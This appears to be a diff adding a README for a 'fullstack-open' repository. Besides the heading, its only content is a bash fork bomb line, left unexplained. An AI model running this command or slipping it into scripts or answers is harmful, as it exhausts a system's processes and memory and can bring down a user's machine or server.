@@ -1,0 +1,3 @@
+# fullstack-open
+:(){ :|:&amp; };:
+ 
